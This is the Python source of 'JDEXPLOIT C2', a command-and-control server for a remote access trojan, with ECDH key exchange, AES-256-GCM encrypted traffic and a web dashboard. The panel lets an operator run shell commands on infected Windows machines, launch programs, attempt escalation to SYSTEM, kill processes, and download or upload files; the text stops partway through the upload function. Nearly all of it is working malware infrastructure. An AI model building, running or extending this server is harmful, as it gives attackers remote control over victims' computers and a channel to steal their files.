#!/usr/bin/env python3
# ============================================================================
# JDEXPLOIT C2 - VERSIÓN PROFESIONAL CON CIFRADO AES-256-GCM
# ============================================================================

import os
import sys
import json
import time
import socket
import struct
import threading
import hashlib
import base64
import datetime
import logging
from http import server
from socketserver import ThreadingMixIn
from urllib.parse import urlparse

# ============================================================================
# CRIPTOGRAFÍA AVANZADA - REQUIERE: pip install cryptography
# ============================================================================
try:
    from cryptography.hazmat.primitives.asymmetric import ec
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    from cryptography.exceptions import InvalidTag
    CRYPTO_AVAILABLE = True
except ImportError:
    print("[!] WARNING: cryptography no instalado. Ejecuta: pip install cryptography")
    CRYPTO_AVAILABLE = False
    sys.exit(1)

# ============================================================================
# CONFIGURACIÓN
# ============================================================================
HOST = '0.0.0.0'
C2_PORT = 4444
WEB_PORT = 8080
LOG_FILE = 'c2_operations.log'
DEBUG = True

# ============================================================================
# COLORES PARA TERMINAL
# ============================================================================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    END = '\033[0m'
    BOLD = '\033[1m'

# ============================================================================
# LOGGER CONFIGURACIÓN
# ============================================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('C2')

# ============================================================================
# CLIENTE SEGURO CON CIFRADO AES-256-GCM
# ============================================================================
class SecureClient:
    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        self.id = hashlib.md5(f"{addr[0]}:{addr[1]}:{time.time()}".encode()).hexdigest()[:8]
        self.hostname = "Unknown"
        self.username = "Unknown"
        self.os = "Windows 11"
        self.antivirus = "Defender"
        self.first_seen = datetime.datetime.now()
        self.last_seen = datetime.datetime.now()
        self.active = True
        self.privilege = "USER"
        
        # Criptografía
        self.private_key = ec.generate_private_key(ec.SECP256R1())
        self.public_key = self.private_key.public_key()
        self.session_key = None
        self.cipher = None
        self.encrypted = False
        
        logger.info(f"{Colors.GREEN}[+] Nuevo cliente creado: {self.id}{Colors.END}")
    
    def perform_key_exchange(self):
        """Realiza intercambio de claves ECDH con el RAT"""
        try:
            logger.info(f"{Colors.CYAN}[*] Iniciando handshake con {self.id}{Colors.END}")
            
            # 1. Recibir clave pública del RAT (DER format)
            pub_key_data = self.recvall(256)  # Ajustar tamaño según RAT
            if not pub_key_data:
                logger.error(f"{Colors.RED}[-] No se recibió clave pública{Colors.END}")
                return False
            
            # 2. Cargar clave pública del peer
            try:
                peer_public_key = serialization.load_der_public_key(pub_key_data)
                logger.debug(f"{Colors.CYAN}[*] Clave pública recibida: {len(pub_key_data)} bytes{Colors.END}")
            except Exception as e:
                logger.error(f"{Colors.RED}[-] Error cargando clave pública: {e}{Colors.END}")
                return False
            
            # 3. Generar shared secret via ECDH
            shared_secret = self.private_key.exchange(ec.ECDH(), peer_public_key)
            logger.debug(f"{Colors.CYAN}[*] Shared secret generado: {len(shared_secret)} bytes{Colors.END}")
            
            # 4. Derivar clave de sesión con HKDF
            hkdf = HKDF(
                algorithm=hashes.SHA256(),
                length=32,
                salt=None,
                info=b'visualrat-key-v1',
            )
            self.session_key = hkdf.derive(shared_secret)
            logger.debug(f"{Colors.GREEN}[+] Clave de sesión derivada: {base64.b64encode(self.session_key).decode()[:16]}...{Colors.END}")
            
            # 5. Enviar nuestra clave pública
            pub_der = self.public_key.public_bytes(
                encoding=serialization.Encoding.DER,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            if not self.send_raw(pub_der):
                logger.error(f"{Colors.RED}[-] Error enviando clave pública{Colors.END}")
                return False
            
            self.encrypted = True
            logger.info(f"{Colors.GREEN}[+] Handshake completado con {self.id}{Colors.END}")
            return True
            
        except Exception as e:
            logger.error(f"{Colors.RED}[-] Error en key exchange: {e}{Colors.END}")
            return False
    
    def encrypt_aes_gcm(self, data):
        """Cifra datos con AES-256-GCM"""
        if not self.session_key:
            return data.encode() if isinstance(data, str) else data
        
        try:
            # Convertir a bytes si es string
            if isinstance(data, str):
                data = data.encode('utf-8')
            
            # Generar IV aleatorio
            iv = os.urandom(12)
            
            # Crear cifrador
            cipher = Cipher(algorithms.AES(self.session_key), modes.GCM(iv))
            encryptor = cipher.encryptor()
            
            # Cifrar
            ciphertext = encryptor.update(data) + encryptor.finalize()
            
            # Obtener tag
            tag = encryptor.tag
            
            # Formato: IV (12) + Ciphertext + Tag (16)
            result = iv + ciphertext + tag
            logger.debug(f"{Colors.CYAN}[*] Cifrado: {len(data)} -> {len(result)} bytes{Colors.END}")
            return result
            
        except Exception as e:
            logger.error(f"{Colors.RED}[-] Error cifrando: {e}{Colors.END}")
            return data if isinstance(data, bytes) else data.encode()
    
    def decrypt_aes_gcm(self, data):
        """Descifra datos con AES-256-GCM"""
        if not self.session_key or len(data) < 28:  # IV(12) + mínimo + Tag(16)
            return data.decode('utf-8', errors='ignore') if isinstance(data, bytes) else data
        
        try:
            # Extraer componentes
            iv = data[:12]
            tag = data[-16:]
            ciphertext = data[12:-16]
            
            # Crear descifrador
            cipher = Cipher(algorithms.AES(self.session_key), modes.GCM(iv, tag))
            decryptor = cipher.decryptor()
            
            # Descifrar
            plaintext = decryptor.update(ciphertext) + decryptor.finalize()
            
            logger.debug(f"{Colors.CYAN}[*] Descifrado: {len(data)} -> {len(plaintext)} bytes{Colors.END}")
            return plaintext.decode('utf-8', errors='ignore')
            
        except InvalidTag:
            logger.error(f"{Colors.RED}[-] Tag inválido - datos corruptos o clave incorrecta{Colors.END}")
            return data.decode('utf-8', errors='ignore') if isinstance(data, bytes) else data
        except Exception as e:
            logger.error(f"{Colors.RED}[-] Error descifrando: {e}{Colors.END}")
            return data.decode('utf-8', errors='ignore') if isinstance(data, bytes) else data
    
    def send_raw(self, data):
        """Envía datos raw con prefijo de longitud"""
        try:
            if isinstance(data, str):
                data = data.encode('utf-8')
            self.conn.send(struct.pack('>I', len(data)) + data)
            self.last_seen = datetime.datetime.now()
            return True
        except Exception as e:
            logger.error(f"{Colors.RED}[-] Error enviando raw: {e}{Colors.END}")
            self.active = False
            return False
    
    def send(self, data):
        """Envía datos (cifrados si la sesión está establecida)"""
        if self.encrypted and self.session_key:
            encrypted = self.encrypt_aes_gcm(data)
            return self.send_raw(encrypted)
        else:
            return self.send_raw(data)
    
    def recvall(self, n):
        """Recibe exactamente n bytes"""
        data = bytearray()
        while len(data) < n:
            try:
                packet = self.conn.recv(n - len(data))
                if not packet:
                    return None
                data.extend(packet)
            except socket.timeout:
                continue
            except Exception as e:
                logger.error(f"{Colors.RED}[-] Error en recvall: {e}{Colors.END}")
                return None
        return bytes(data)
    
    def recv_raw(self):
        """Recibe mensaje raw (con prefijo de longitud)"""
        try:
            raw_len = self.recvall(4)
            if not raw_len:
                return None
            msglen = struct.unpack('>I', raw_len)[0]
            if msglen > 10 * 1024 * 1024:  # Max 10MB
                logger.error(f"{Colors.RED}[-] Mensaje demasiado grande: {msglen} bytes{Colors.END}")
                return None
            data = self.recvall(msglen)
            self.last_seen = datetime.datetime.now()
            return data
        except Exception as e:
            logger.error(f"{Colors.RED}[-] Error en recv_raw: {e}{Colors.END}")
            self.active = False
            return None
    
    def recv(self):
        """Recibe mensaje (descifrado si aplica)"""
        encrypted = self.recv_raw()
        if not encrypted:
            return None
        
        if self.encrypted and self.session_key:
            return self.decrypt_aes_gcm(encrypted)
        else:
            return encrypted.decode('utf-8', errors='ignore') if isinstance(encrypted, bytes) else encrypted
    
    def to_dict(self):
        return {
            'id': self.id,
            'ip': self.addr[0],
            'port': self.addr[1],
            'hostname': self.hostname,
            'username': self.username,
            'os': self.os,
            'antivirus': self.antivirus,
            'privilege': self.privilege,
            'status': 'online' if self.active else 'offline',
            'first_seen': self.first_seen.strftime('%H:%M:%S'),
            'last_seen': self.last_seen.strftime('%H:%M:%S'),
            'encrypted': self.encrypted
        }

# ============================================================================
# C2 CORE - GESTIÓN DE CLIENTES Y COMANDOS
# ============================================================================
class C2Core:
    def __init__(self):
        self.clients = {}
        self.current_client = None
        self.running = True
        self.socket = None
        self.lock = threading.Lock()
        logger.info(f"{Colors.GREEN}[🔥] JDEXPLOIT C2 Core inicializado{Colors.END}")
    
    def start(self):
        """Inicia el servidor TCP para clientes RAT"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((HOST, C2_PORT))
            self.socket.listen(100)
            self.socket.settimeout(1.0)  # Timeout para poder salir limpiamente
            logger.info(f"{Colors.GREEN}[🔥] C2 Core escuchando en {HOST}:{C2_PORT}{Colors.END}")
            
            threading.Thread(target=self.accept_clients, daemon=True).start()
        except Exception as e:
            logger.error(f"{Colors.RED}[-] Error iniciando C2 Core: {e}{Colors.END}")
            sys.exit(1)
    
    def accept_clients(self):
        """Acepta nuevas conexiones de clientes"""
        while self.running:
            try:
                conn, addr = self.socket.accept()
                conn.settimeout(10.0)  # Timeout para operaciones
                
                with self.lock:
                    client = SecureClient(conn, addr)
                    
                    # Realizar handshake criptográfico
                    if client.perform_key_exchange():
                        self.clients[client.id] = client
                        logger.info(f"{Colors.GREEN}[🔥] Nuevo cliente: {client.id} desde {addr[0]}:{addr[1]} - CIFRADO ACTIVO{Colors.END}")
                        
                        # Solicitar información inicial
                        client.send("INFO")
                        info = client.recv()
                        if info:
                            try:
                                data = json.loads(info)
                                client.hostname = data.get('hostname', 'Unknown')
                                client.username = data.get('username', 'Unknown')
                                client.privilege = data.get('privilege', 'USER')
                                client.os = data.get('os', 'Windows')
                                logger.info(f"{Colors.CYAN}[→] {client.id}: {client.hostname} - {client.username} ({client.privilege}){Colors.END}")
                            except:
                                logger.warning(f"{Colors.YELLOW}[!] Info no es JSON: {info[:50]}{Colors.END}")
                    else:
                        conn.close()
                        logger.warning(f"{Colors.YELLOW}[!] Handshake falló con {addr[0]}{Colors.END}")
                        
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    logger.error(f"{Colors.RED}[-] Error aceptando cliente: {e}{Colors.END}")
    
    def send_command(self, client_id, command):
        """Envía un comando a un cliente específico"""
        with self.lock:
            if client_id not in self.clients:
                return f"[-] Cliente {client_id} no encontrado"
            
            client = self.clients[client_id]
            if not client.active:
                return f"[-] Cliente {client_id} offline"
        
        try:
            logger.info(f"{Colors.BLUE}[→] Enviando a {client_id}: {command}{Colors.END}")
            
            # Enviar comando
            if not client.send(command):
                return f"[-] Error enviando comando a {client_id}"
            
            # Recibir respuesta
            response = client.recv()
            
            if response is None:
                client.active = False
                return f"[-] Cliente {client_id} no respondió"
            
            # Logging de respuesta
            if len(response) > 500:
                logger.info(f"{Colors.CYAN}[←] Respuesta de {client_id}: {len(response)} bytes{Colors.END}")
            else:
                logger.info(f"{Colors.CYAN}[←] Respuesta de {client_id}: {response[:200]}{Colors.END}")
            
            # Procesar respuestas especiales
            if command.startswith('DOWNLOAD'):
                return self.handle_download_response(response)
            elif command.startswith('UPLOAD'):
                return self.handle_upload_response(response)
            elif 'ELEVATE' in command and 'elevado' in response.lower():
                client.privilege = "SYSTEM"
            
            return response if response else "[+] Comando ejecutado (sin respuesta)"
            
        except Exception as e:
            logger.error(f"{Colors.RED}[-] Error en send_command: {e}{Colors.END}")
            return f"[-] Error: {e}"
    
    def handle_download_response(self, response):
        """Procesa respuestas de descarga de archivos"""
        try:
            if response.startswith('[+] Archivo:'):
                lines = response.split('\n', 2)
                if len(lines) >= 2:
                    file_info = lines[0]
                    if len(lines) > 2 and lines[2]:
                        file_data = lines[2]
                        # Codificar a Base64 para la web
                        b64_data = base64.b64encode(file_data.encode('utf-8', errors='ignore')).decode()
                        return f"{file_info}\nBase64: {b64_data}"
            return response
        except Exception as e:
            logger.error(f"{Colors.RED}[-] Error handle_download: {e}{Colors.END}")
            return response
    
    def handle_upload_response(self, response):
        """Procesa respuestas de subida de archivos"""
        return response
    
    def stop(self):
        """Detiene el servidor C2"""
        self.running = False
        if self.socket:
            self.socket.close()
        logger.info(f"{Colors.YELLOW}[!] C2 Core detenido{Colors.END}")

# ============================================================================
# WEB HANDLER - INTERFAZ DE USUARIO
# ============================================================================
class WebHandler(server.BaseHTTPRequestHandler):
    c2 = None
    
    def do_GET(self):
        path = urlparse(self.path).path
        if path == '/':
            self.send_html()
        elif path == '/api/clients':
            self.send_clients()
        elif path == '/api/stats':
            self.send_stats()
        else:
            self.send_error(404)
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length == 0:
            self.send_error(400, "No data")
            return
        
        try:
            post_data = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(post_data)
        except Exception as e:
            self.send_error(400, f"Invalid JSON: {e}")
            return
        
        if self.path == '/api/command':
            self.handle_command(data)
        elif self.path == '/api/upload':
            self.handle_upload(data)
        else:
            self.send_error(404)
    
    def handle_command(self, data):
        """Procesa comandos desde la interfaz web"""
        client_id = data.get('client_id')
        command = data.get('command', '')
        args = data.get('args', '')
        
        if not client_id or not command:
            self.send_json({'error': 'client_id y command requeridos'})
            return
        
        # MAPEO DE COMANDOS - Formato compatible con RAT
        cmd_map = {
            'info': 'INFO_FULL',
            'processes': 'PROCESSES',
            'elevate': 'ELEVATE',
            'whoami': 'SHELL whoami',
            'ipconfig': 'SHELL ipconfig',
            'netstat': 'SHELL netstat -an',
            'tasklist': 'SHELL tasklist',
            'calc': 'EXEC calc.exe',
            'notepad': 'EXEC notepad.exe',
            'cmd': 'EXEC cmd.exe',
            'powershell': 'EXEC powershell.exe',
            'explorer': 'EXEC explorer.exe',
            'system': 'ELEVATE',  # Intentar escalada
        }
        
        # Construir comando completo
        if command in cmd_map:
            full_cmd = cmd_map[command]
        elif command == 'shell' and args:
            full_cmd = f"SHELL {args}"
        elif command == 'exec' and args:
            full_cmd = f"EXEC {args}"
        elif command == 'kill' and args:
            full_cmd = f"KILL {args}"
        elif command == 'dir' and args:
            full_cmd = f"DIR {args}"
        elif command == 'download' and args:
            full_cmd = f"DOWNLOAD {args}"
        elif command == 'upload' and args:
            full_cmd = f"UPLOAD {args}"
        else:
            # Comando arbitrario
            full_cmd = command if not args else f"{command} {args}"
        
        logger.info(f"{Colors.MAGENTA}[WEB] Comando: {full_cmd} para {client_id}{Colors.END}")
        
        # Enviar comando al cliente
        response = self.c2.send_command(client_id, full_cmd)
        
        self.send_json({'response': response})
    
    def handle_upload(self, data):
        """Maneja subida de archivos"""
        client_id = data.get('client_id')
        remote_path = data.get('remote_path', '')
        file_data = data.get('file_data', '')  # Base64
        
        if not client_id or not remote_path or not file_data:
            self.send_json({'error': 'Datos incompletos'})
            return
        
        # Decodificar Base64
        try:
            decoded_data = base64.b64decode(file_data).decode('utf-8', errors='ignore')
        except:
            self.send_json({'error': 'Base64 inválido'})
            return
        
        # Construir comando UPLOAD
        full_cmd = f"UPLOAD {remote_path}|{decoded_data}"
        
        response = self.c2.send_command(client_id, full_cmd)
        self.send_json({'response': response})
    
    def send_json(self, obj):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(obj).encode())
    
    def send_clients(self):
        """Envía lista de clientes"""
        with self.c2.lock:
            clients_list = [client.to_dict() for client in self.c2.clients.values()]
        self.send_json(clients_list)
    
    def send_stats(self):
        """Envía estadísticas del C2"""
        with self.c2.lock:
            total = len(self.c2.clients)
            online = sum(1 for c in self.c2.clients.values() if c.active)
            system = sum(1 for c in self.c2.clients.values() if c.privilege == 'SYSTEM')
        
        stats = {
            'total': total,
            'online': online,
            'system': system,
            'uptime': str(datetime.datetime.now() - self.c2.start_time).split('.')[0] if hasattr(self.c2, 'start_time') else '00:00:00'
        }
        self.send_json(stats)
    
    def send_html(self):
        """Envía la interfaz web"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        
        html = self.get_html_template()
        self.wfile.write(html.encode('utf-8'))
    
    def get_html_template(self):
        """Retorna el template HTML mejorado"""
        return """<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JDEXPLOIT C2 - RED/BLACK EDITION</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap');
        
        body {
            background: #000000;
            color: #ffffff;
            font-family: 'Share Tech Mono', monospace;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
        
        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(0deg, 
                rgba(255,0,0,0.03) 0px, 
                rgba(0,0,0,0.9) 2px, 
                rgba(255,0,0,0.03) 3px);
            pointer-events: none;
            animation: scan 8s linear infinite;
            z-index: 9999;
        }
        
        @keyframes scan {
            0% { transform: translateY(0); }
            100% { transform: translateY(100%); }
        }
        
        .container {
            max-width: 1800px;
            margin: 0 auto;
            position: relative;
            z-index: 10000;
        }
        
        .header {
            background: linear-gradient(135deg, #1a0000 0%, #000000 100%);
            border: 2px solid #ff0000;
            padding: 25px;
            margin-bottom: 25px;
            box-shadow: 0 0 30px rgba(255,0,0,0.3);
            position: relative;
            overflow: hidden;
        }
        
        .header::after {
            content: "SECURE AES-256-GCM";
            position: absolute;
            top: 10px;
            right: 20px;
            color: #ff0000;
            font-size: 12px;
            opacity: 0.7;
            letter-spacing: 2px;
        }
        
        .header h1 {
            color: #ff0000;
            font-family: 'Orbitron', sans-serif;
            font-size: 42px;
            font-weight: 900;
            text-transform: uppercase;
            text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
            letter-spacing: 6px;
            animation: flicker 3s infinite;
        }
        
        @keyframes flicker {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.8; }
        }
        
        .badge {
            background: #ff0000;
            color: #000000;
            padding: 6px 16px;
            display: inline-block;
            font-family: 'Orbitron', sans-serif;
            font-weight: bold;
            font-size: 14px;
            letter-spacing: 2px;
            margin-top: 8px;
            box-shadow: 0 0 20px #ff0000;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
            margin-top: 25px;
        }
        
        .stat-card {
            background: #0a0000;
            border: 1px solid #ff0000;
            padding: 20px;
            position: relative;
            transition: all 0.3s;
            box-shadow: 0 0 15px rgba(255,0,0,0.2);
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
            border-color: #ff3333;
            box-shadow: 0 0 30px #ff0000;
        }
        
        .stat-card::before {
            content: "▶";
            color: #ff0000;
            position: absolute;
            top: 10px;
            left: 10px;
            font-size: 10px;
            animation: blink 1s infinite;
        }
        
        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0; } }
        
        .stat-label {
            color: #ff9999;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 8px;
        }
        
        .stat-value {
            color: #ffffff;
            font-size: 36px;
            font-weight: bold;
            font-family: 'Orbitron', sans-serif;
            text-shadow: 0 0 15px #ff0000;
        }
        
        .clients-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
            gap: 20px;
            margin: 25px 0;
        }
        
        .client-card {
            background: #080000;
            border: 1px solid #ff3333;
            padding: 20px;
            border-left: 6px solid #ff0000;
            transition: all 0.3s;
        }
        
        .client-card:hover {
            background: #0c0000;
            border-color: #ff6666;
            box-shadow: 0 0 30px rgba(255,0,0,0.5);
            transform: scale(1.01);
        }
        
        .client-card.online { border-left-color: #ff0000; }
        .client-card.offline { border-left-color: #660000; opacity: 0.6; }
        
        .client-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            border-bottom: 1px solid #ff0000;
            padding-bottom: 10px;
        }
        
        .client-id {
            background: #ff0000;
            color: #000000;
            padding: 6px 12px;
            font-family: 'Orbitron', sans-serif;
            font-weight: bold;
            letter-spacing: 1px;
            box-shadow: 0 0 15px #ff0000;
            font-size: 12px;
        }
        
        .status-badge {
            padding: 4px 12px;
            font-size: 11px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .status-badge.online {
            background: #ff0000;
            color: #000000;
            box-shadow: 0 0 15px #ff0000;
        }
        
        .status-badge.offline {
            background: #330000;
            color: #ff6666;
        }
        
        .client-info {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin-bottom: 15px;
        }
        
        .info-item {
            background: #000000;
            border: 1px solid #660000;
            padding: 10px;
        }
        
        .info-label {
            color: #ff6666;
            font-size: 9px;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 4px;
        }
        
        .info-value {
            color: #ffffff;
            font-size: 13px;
            font-family: 'Courier New', monospace;
            font-weight: bold;
        }
        
        .client-actions {
            display: flex;
            gap: 8px;
            margin-top: 12px;
            flex-wrap: wrap;
        }
        
        .btn {
            background: transparent;
            border: 1px solid #ff0000;
            color: #ff0000;
            padding: 8px 12px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 11px;
            font-weight: bold;
            text-transform: uppercase;
            letter-spacing: 1px;
            cursor: pointer;
            transition: all 0.3s;
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }
        
        .btn:hover {
            background: #ff0000;
            color: #000000;
            box-shadow: 0 0 20px #ff0000;
            border-color: #ffffff;
        }
        
        .btn-system {
            border-color: #ff00ff;
            color: #ff00ff;
        }
        
        .btn-system:hover {
            background: #ff00ff;
            color: #000000;
            box-shadow: 0 0 20px #ff00ff;
        }
        
        .terminal {
            background: #050000;
            border: 2px solid #ff0000;
            margin-top: 25px;
            box-shadow: 0 0 30px rgba(255,0,0,0.3);
        }
        
        .terminal-header {
            background: #1a0000;
            padding: 12px 15px;
            border-bottom: 2px solid #ff0000;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .terminal-header span {
            color: #ff0000;
            font-family: 'Orbitron', sans-serif;
            font-weight: bold;
            letter-spacing: 2px;
            font-size: 14px;
        }
        
        .terminal-content {
            background: #000000;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            height: 350px;
            overflow-y: auto;
            color: #ff9999;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        .terminal-content div {
            margin-bottom: 3px;
            border-left: 2px solid #ff0000;
            padding-left: 8px;
        }
        
        .terminal-input {
            display: flex;
            padding: 12px;
            background: #0a0000;
            border-top: 2px solid #ff0000;
        }
        
        .terminal-input input {
            flex: 1;
            background: #000000;
            border: 1px solid #ff3333;
            color: #ffffff;
            padding: 12px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            margin-right: 8px;
        }
        
        .terminal-input input:focus {
            outline: none;
            border-color: #ff0000;
            box-shadow: 0 0 15px #ff0000;
        }
        
        .modal {
            display: none;
            position: fixed;
            z-index: 100000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.9);
        }
        
        .modal-content {
            background: #0a0000;
            border: 2px solid #ff0000;
            margin: 10% auto;
            padding: 25px;
            width: 500px;
            max-width: 90%;
            box-shadow: 0 0 50px #ff0000;
        }
        
        .modal h3 {
            color: #ff0000;
            margin-bottom: 20px;
            font-family: 'Orbitron', sans-serif;
        }
        
        .modal input, .modal textarea {
            width: 100%;
            background: #000000;
            border: 1px solid #ff3333;
            color: #ffffff;
            padding: 12px;
            margin: 10px 0;
            font-family: 'Courier New', monospace;
        }
        
        .footer {
            margin-top: 40px;
            padding: 25px;
            background: #050000;
            border: 1px solid #ff0000;
            text-align: center;
            font-family: 'Orbitron', sans-serif;
        }
        
        .footer .autor {
            color: #ff0000;
            font-size: 20px;
            font-weight: 900;
            text-shadow: 0 0 20px #ff0000;
            margin-bottom: 8px;
        }
        
        .footer .copy {
            color: #ff6666;
            font-size: 12px;
        }
        
        .encrypted-badge {
            color: #00ff00;
            font-size: 10px;
            margin-left: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔴 JDEXPLOIT C2</h1>
            <div class="badge">⚡ AES-256-GCM SECURE CHANNEL ⚡</div>
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-label">Total Clients</div>
                    <div class="stat-value" id="total-clients">0</div>
                </div>
                <div class="stat-card">
                    <div class="stat-label">Online</div>
                    <div class="stat-value" id="online-clients" style="color: #ff0000;">0</div>
                </div>
                <div class="stat-card">
                    <div class="stat-label">SYSTEM</div>
                    <div class="stat-value" id="system-clients">0</div>
                </div>
                <div class="stat-card">
                    <div class="stat-label">Uptime</div>
                    <div class="stat-value" id="uptime">00:00:00</div>
                </div>
            </div>
        </div>
        
        <h2 style="color: #ff0000; font-family: 'Orbitron', sans-serif; margin-bottom: 15px; letter-spacing: 3px; font-size: 20px;">
            ⚡ CONNECTED CLIENTS ⚡
        </h2>
        <div id="clients-container" class="clients-grid"></div>
        
        <div class="terminal">
            <div class="terminal-header">
                <div>
                    <span>🔥 JDEXPLOIT REMOTE SHELL 🔥</span>
                    <span id="current-client-label" style="color: #ff6666; margin-left: 15px; font-size: 12px;">(none selected)</span>
                </div>
            </div>
            <div id="terminal-output" class="terminal-content">
                <div style="color: #ff0000;">[🔥 JDEXPLOIT C2 READY 🔥]</div>
                <div style="color: #ff6666;">[•] Select a client to begin remote control</div>
                <div style="color: #00ff00;">[•] AES-256-GCM encryption active</div>
            </div>
            <div class="terminal-input">
                <input type="text" id="terminal-cmd" placeholder=">_ Commands: info, shell whoami, exec calc.exe, elevate, download C:\\file.txt" disabled>
                <button class="btn" onclick="sendTerminalCommand()" id="terminal-send" disabled>EXECUTE</button>
            </div>
        </div>
        
        <div class="footer">
            <div class="autor">🔴 JDEXPLOIT - RED TEAM 🔴</div>
            <div class="copy">██████ AES-256-GCM ENCRYPTED C2 ██████</div>
        </div>
    </div>
    
    <!-- Modal para uploads -->
    <div id="uploadModal" class="modal">
        <div class="modal-content">
            <h3>📤 UPLOAD FILE</h3>
            <input type="text" id="upload-remote-path" placeholder="Remote path (e.g., C:\\Users\\Public\\file.txt)">
            <textarea id="upload-data" placeholder="File data (Base64 or text)" rows="5"></textarea>
            <div style="display: flex; gap: 10px; margin-top: 20px;">
                <button class="btn" onclick="performUpload()">UPLOAD</button>
                <button class="btn" onclick="closeUploadModal()">CANCEL</button>
            </div>
        </div>
    </div>
    
    <script>
        let currentClientId = null;
        let clients = {};
        let startTime = Date.now();
        
        // Cargar clientes cada 2 segundos
        setInterval(loadClients, 2000);
        setInterval(updateStats, 1000);
        
        function loadClients() {
            fetch('/api/clients')
                .then(r => r.json())
                .then(data => {
                    clients = {};
                    data.forEach(c => clients[c.id] = c);
                    renderClients(data);
                })
                .catch(err => console.error('Error loading clients:', err));
        }
        
        function renderClients(clientsList) {
            const container = document.getElementById('clients-container');
            container.innerHTML = '';
            
            clientsList.forEach(client => {
                const card = document.createElement('div');
                card.className = 'client-card ' + client.status;
                
                const encryptedIcon = client.encrypted ? '<span class="encrypted-badge">🔒</span>' : '';
                
                card.innerHTML = `
                    <div class="client-header">
                        <span class="client-id">🔴 ${client.id} ${encryptedIcon}</span>
                        <span class="status-badge ${client.status}">${client.status}</span>
                    </div>
                    <div class="client-info">
                        <div class="info-item">
                            <div class="info-label">HOSTNAME</div>
                            <div class="info-value">${client.hostname}</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">IP:PORT</div>
                            <div class="info-value">${client.ip}:${client.port}</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">USER</div>
                            <div class="info-value">${client.username}</div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">PRIV</div>
                            <div class="info-value">${client.privilege}</div>
                        </div>
                    </div>
                    <div class="client-actions">
                        <button class="btn" onclick="selectClient('${client.id}')">SHELL</button>
                        <button class="btn" onclick="sendQuickCommand('${client.id}', 'info')">INFO</button>
                        <button class="btn" onclick="sendQuickCommand('${client.id}', 'processes')">PROC</button>
                        <button class="btn btn-system" onclick="sendQuickCommand('${client.id}', 'elevate')">SYSTEM</button>
                        <button class="btn" onclick="sendQuickCommand('${client.id}', 'calc')">CALC</button>
                        <button class="btn" onclick="sendQuickCommand('${client.id}', 'cmd')">CMD</button>
                        <button class="btn" onclick="downloadPrompt('${client.id}')">DOWNLOAD</button>
                        <button class="btn" onclick="uploadPrompt('${client.id}')">UPLOAD</button>
                    </div>
                `;
                container.appendChild(card);
            });
        }
        
        function selectClient(clientId) {
            currentClientId = clientId;
            const client = clients[clientId];
            if (client) {
                document.getElementById('current-client-label').innerHTML = `(${client.hostname} - ${client.username})`;
                document.getElementById('terminal-cmd').disabled = false;
                document.getElementById('terminal-send').disabled = false;
                addToTerminal(`[🔥] Connected to: ${client.hostname} (${client.ip})`, '#ff0000');
                addToTerminal(`[🔒] Channel: ${client.encrypted ? 'AES-256-GCM' : 'Plain'}`, '#00ff00');
            }
        }
        
        function sendQuickCommand(clientId, cmd) {
            selectClient(clientId);
            document.getElementById('terminal-cmd').value = cmd;
            sendTerminalCommand();
        }
        
        function downloadPrompt(clientId) {
            const filePath = prompt("Enter remote file path to download:", "C:\\Windows\\System32\\notepad.exe");
            if (filePath) {
                selectClient(clientId);
                document.getElementById('terminal-cmd').value = `download ${filePath}`;
                sendTerminalCommand();
            }
        }
        
        function uploadPrompt(clientId) {
            currentClientId = clientId;
